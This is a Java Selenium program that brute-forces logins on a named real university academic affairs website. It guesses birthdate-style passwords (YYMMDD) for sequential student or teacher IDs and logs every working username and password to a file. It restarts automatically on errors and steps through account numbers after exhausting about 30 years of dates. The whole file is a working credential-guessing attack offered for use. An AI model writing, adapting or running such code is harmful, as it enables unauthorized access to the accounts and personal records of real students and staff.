package com.ycs.selenium;

import javax.annotation.Resource;

import org.junit.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.springframework.stereotype.Component;

import com.linux.GetDriver;
import com.ycs.model.service.StudentInfoService;
import com.ycs.util.MyUtil;
import com.ycs.util.SeleniumUtil;

@Component
public class JiaoWuAllPass{
	@Resource
	protected StudentInfoService studentInfoService;
	protected WebDriver driver;
	protected JavascriptExecutor jse;
	

	public void start() {
		System.out.println("start");
		driver=GetDriver.getDriver();
//		driver=SeleniumUtil.getChromeDriver();
		jse = (JavascriptExecutor) driver;
	}
	public void shutdown(){
		System.out.println("shutdown");
		driver.quit();
	}
	public void restart(){
		System.out.println("restart");
		SeleniumUtil.fileWrite("driver.txt",MyUtil.getFormatDate(""));
		shutdown();
		start();
	}
	
	@Test
	public void T(){
		String a=yearPass(2016, 11);
		System.out.println(a);
	}
	
//	@Test
	public void startPass(String operate,String type,String studyId,int year,int count){
		try {
			start();
//			int year=1994;
			String userPass="";
			int now=0;
			int yearCount=0;
			int yearDay=372;
			int yearNow=0;
			int yearCC=0;
			boolean flag=false;
			SeleniumUtil.fileWrite("studyId.txt",studyId+"");
			while(!flag){
				try {
					now=count%yearDay+1;//[1-372]天数
					yearCount=count/yearDay;//年数
					yearCC=(yearCount+1)/2;//年数一半
					//加减年数---实际年数
					if(yearCount%2==0){
						yearNow=year-yearCC;
					}
					if(yearCount%2==1){
						yearNow=year+yearCC;
					}
					//实际年数，天数
					userPass=yearPass(yearNow,now);
					//进行破解,并记录
					flag=login(type,studyId,userPass,count);
					SeleniumUtil.fileWrite("count.txt",count+"");
					
					count++;
					//尝试30年之后，放弃此工号，重置参数并到下一个工号
					if(count>11200){
						count=0;
						if(operate.equals("add")){
							studyId=(Integer.parseInt(studyId)+1)+"";
						}
						if(operate.equals("sub")){
							studyId=(Integer.parseInt(studyId)-1)+"";
						}
						SeleniumUtil.fileWrite("studyId.txt",studyId+"");
					}
				} catch (Exception e) {
//					e.printStackTrace();
					//出现异常，重启机制
					System.out.println("phantomjs Throw Exception，restart Right Now++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
					count--;
					restart();
					continue;
				}
			}
			
			
		} catch (Exception e) {
			e.printStackTrace();
		}finally{
			shutdown();
		}
	}


	public String yearPass(int year,int nowDay){
		
		int yearDay=372;
		if(nowDay>yearDay){
			nowDay=yearDay;
		}
		if(nowDay<1){
			nowDay=1;
		}
		int month=1;
		int day=1;
		String now="";
		String yearStr="";
		String monthStr="";
		String dayStr="";
		for(int i=0;i<nowDay;i++){
			yearStr=year+"";
			monthStr=month+"";
			dayStr=day+"";
			if(monthStr.length()==1){
				monthStr="0"+monthStr;
			}
			if(dayStr.length()==1){
				dayStr="0"+dayStr;
			}
			now=yearStr+monthStr+dayStr;
			if(day>=31){
				day=1;
				if(month>=12){
					month=1;
					year++;
				}else{
					month++;
				}
			}else{
				day++;
			}
//			System.out.println(now);
		}
		now=now.substring(2);
		return now;
	}
	
	public boolean login(String type,String userName,String userPass,int count) throws InterruptedException{
		String url = "http://jiaowu.sicau.edu.cn/web/web/web/index.asp";
		String check="http://jiaowu.sicau.edu.cn/jiaoshi/bangong/check.asp";
		
		String main="http://jiaowu.sicau.edu.cn/xuesheng/bangong/main/index1.asp";
		String pj="http://jiaowu.sicau.edu.cn/xuesheng/pj/pj/index.asp";
		driver.get(url);
		driver.findElement(By.xpath("//*[@id=\"username\"]")).sendKeys(userName);
		driver.findElement(By.xpath("//*[@id=\"password\"]")).sendKeys(userPass);
		if(type.equals("s")){
			driver.findElement(By.xpath("/html/body/div/div[3]/div/div/div[2]/fieldset/form/p[3]/input[1]")).click();
		}
		if(type.equals("t")){
			driver.findElement(By.xpath("/html/body/div/div[3]/div/div/div[2]/fieldset/form/p[3]/input[2]")).click();
		}
//		SeleniumUtil.printScrenn((TakesScreenshot) driver, "a.png");
		driver.findElement(By.xpath("//*[@id=\"submit\"]")).click();
		String nowUrl="";
		nowUrl=driver.getCurrentUrl();
		System.out.println(nowUrl);
		if(!nowUrl.equals(url)&&!nowUrl.equals(check)&&!nowUrl.equals("")&&!nowUrl.equals(null)){
			SeleniumUtil.fileWrite("pass.txt",type+","+count+"\t"+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss")+"\tYES"+"\t"+nowUrl);
			System.out.println(type+","+count+"\t"+"YES:"+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss")+"*********************************************************");
			return true;
		}else{
			SeleniumUtil.fileWrite("pass.txt",type+","+count+"\t"+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss")+"\tNO");
			System.out.println(type+","+count+"\t"+"NO:"+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss"));
			return false;
		}
	}


	
	

	



}
